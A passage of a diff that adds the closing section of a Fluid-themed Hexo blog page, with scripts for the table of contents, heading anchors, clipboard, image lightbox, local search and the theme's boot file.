+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
